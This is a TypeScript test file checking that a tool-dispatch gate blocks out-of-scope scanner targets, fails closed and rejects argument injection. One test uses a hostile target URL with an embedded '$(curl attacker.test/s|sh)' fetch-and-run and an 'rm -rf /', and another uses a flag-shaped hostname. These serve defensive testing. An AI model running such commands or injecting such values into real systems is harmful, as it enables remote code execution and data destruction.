/**
 * dispatchTool() — the external-tool-execution chokepoint. Adversarial set
 * mirroring scope-egress-chokepoint.test.ts's methodology for scopedHttp,
 * plus the argument-injection guard specific to tool dispatch (execFile
 * with array args stops shell injection but not a flag-shaped substituted
 * value being reparsed by the tool's own arg parser).
 *
 * child_process.execFile is mocked via promisify.custom (same technique as
 * the RCE-stopgap tests) so every real command dispatchTool would issue is
 * directly observable, and ScopeGuard is mocked so scope decisions are
 * deterministic per test case.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';

const { execFileImpl, isInScopeMock } = vi.hoisted(() => ({
  execFileImpl: vi.fn(async (_bin: string, _args: string[]) => ({ stdout: 'ok', stderr: '' })),
  isInScopeMock: vi.fn(),
}));

vi.mock('child_process', () => {
  function execFile(bin: string, args: string[], optsOrCb: any, cb?: any) {
    const callback = typeof optsOrCb === 'function' ? optsOrCb : cb;
    execFileImpl(bin, args).then(
      (r: any) => callback(null, r.stdout, r.stderr),
      (e: any) => callback(e),
    );
  }
  (execFile as any)[Symbol.for('nodejs.util.promisify.custom')] = execFileImpl;
  return { execFile };
});

vi.mock('../middleware/scopeGuard', () => ({
  ScopeGuard: {
    getInstance: vi.fn().mockReturnValue({ isInScope: isInScopeMock }),
  },
}));

vi.mock('../utils/logger', () => ({
  default: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

import {
  dispatchTool, ToolOutOfScopeError, ToolTargetInvalidError, ToolArgumentInjectionError,
} from '../lib/net/dispatch-tool';

const PROGRAM_ID = 101;

beforeEach(() => {
  execFileImpl.mockClear();
  isInScopeMock.mockReset();
});

describe('dispatchTool — adversarial set', () => {
  it('1. in-scope target → dispatched', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    const result = await dispatchTool({
      tool: 'nmap',
      target: 'https://example.com/path',
      args: ['-sV', '{domain}'],
      programId: PROGRAM_ID,
    });
    expect(execFileImpl).toHaveBeenCalledWith('nmap', ['-sV', 'example.com'], expect.any(Object));
    expect(result.stdout).toBe('ok');
  });

  it('2. out-of-scope target → blocked, never exec\'d', async () => {
    isInScopeMock.mockResolvedValue({ allowed: false, reason: 'URL not found in any in-scope patterns' });
    await expect(dispatchTool({
      tool: 'nmap',
      target: 'https://evil.com/',
      args: ['-sV', '{domain}'],
      programId: PROGRAM_ID,
    })).rejects.toThrow(ToolOutOfScopeError);
    expect(execFileImpl).not.toHaveBeenCalled();
  });

  it('3. excluded subdomain of an in-scope wildcard → blocked, never exec\'d', async () => {
    // ScopeGuard itself owns wildcard/exclusion logic (proven in
    // scope-egress-chokepoint.test.ts case 3) — dispatchTool's job is just to
    // honor whatever isInScope() says and never exec on a false verdict.
    isInScopeMock.mockResolvedValue({ allowed: false, reason: 'blocked by out-of-scope pattern: admin.example.com' });
    await expect(dispatchTool({
      tool: 'nikto',
      target: 'https://admin.example.com/panel',
      args: ['-h', '{url}'],
      programId: PROGRAM_ID,
    })).rejects.toThrow(ToolOutOfScopeError);
    expect(execFileImpl).not.toHaveBeenCalled();
  });

  it('4. guard throws → fail closed, never exec\'d', async () => {
    isInScopeMock.mockRejectedValue(new Error('DB connection lost'));
    await expect(dispatchTool({
      tool: 'sqlmap',
      target: 'https://example.com/?id=1',
      args: ['-u', '{url}', '--batch'],
      programId: PROGRAM_ID,
    })).rejects.toThrow('DB connection lost');
    expect(execFileImpl).not.toHaveBeenCalled();
  });

  it('5. a target containing shell metacharacters → passed as a single execFile arg, never interpreted', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    const hostile = 'https://example.com/$(curl attacker.test/s|sh)#;rm -rf /';
    const result = await dispatchTool({
      tool: 'whatweb',
      target: hostile,
      args: ['{url}'],
      programId: PROGRAM_ID,
    });
    // execFile received exactly one array element for {url} — the shell
    // metacharacters are inert data inside that single argument, never
    // concatenated into a string a shell could parse. (new URL() percent-
    // encodes the literal space, but leaves $()| untouched — still inert,
    // since execFile never invokes a shell to interpret them either way.)
    expect(execFileImpl).toHaveBeenCalledTimes(1);
    const [bin, args] = execFileImpl.mock.calls[0];
    expect(bin).toBe('whatweb');
    expect(args).toHaveLength(1);
    expect(args[0]).toContain('$(curl%20attacker.test/s|sh)');
    expect(result.stdout).toBe('ok');
  });

  it('6. (argument injection) a hostname that resolves to a flag-shaped bare placeholder → rejected, never exec\'d', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    // WHATWG URL does not enforce DNS label rules — this is a valid URL whose
    // hostname is the literal string "--exec.example.com" (confirmed via
    // `new URL('https://--exec.example.com/').hostname`).
    const flagShaped = 'https://--exec.example.com/';
    await expect(dispatchTool({
      tool: 'sqlmap',
      target: flagShaped,
      args: ['{domain}', '--batch'],
      programId: PROGRAM_ID,
    })).rejects.toThrow(ToolArgumentInjectionError);
    expect(execFileImpl).not.toHaveBeenCalled();
  });

  it('7. malformed target → ScopeGuard fails closed on it, never reaches exec (real isInScope already handles this — case 7 of scope-egress-chokepoint.test.ts)', async () => {
    isInScopeMock.mockResolvedValue({ allowed: false, reason: 'malformed / unparseable URL' });
    const result = dispatchTool({
      tool: 'nmap',
      target: 'not a url at all ??',
      args: ['{domain}'],
      programId: PROGRAM_ID,
    });
    await expect(result).rejects.toThrow(ToolOutOfScopeError);
    expect(execFileImpl).not.toHaveBeenCalled();
  });

  it('7b. dispatchTool\'s OWN URL validation is defense-in-depth, not just a pass-through of ScopeGuard\'s: a garbage target the guard (hypothetically) approves still gets rejected before exec', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true }); // guard says yes; dispatchTool must not blindly trust that for substitution
    const result = dispatchTool({
      tool: 'nmap',
      target: 'not a url at all ??',
      args: ['{domain}'],
      programId: PROGRAM_ID,
    });
    await expect(result).rejects.toThrow(ToolTargetInvalidError);
    expect(execFileImpl).not.toHaveBeenCalled();
  });

  it('literal (non-placeholder) args pass through untouched, including ones starting with "-"', async () => {
    isInScopeMock.mockResolvedValue({ allowed: true });
    await dispatchTool({
      tool: 'nuclei',
      target: 'https://example.com/',
      args: ['-u', '{url}', '-severity', 'high,critical', '-silent'],
      programId: PROGRAM_ID,
    });
    expect(execFileImpl).toHaveBeenCalledWith('nuclei', ['-u', 'https://example.com/', '-severity', 'high,critical', '-silent'], expect.any(Object));
  });
});
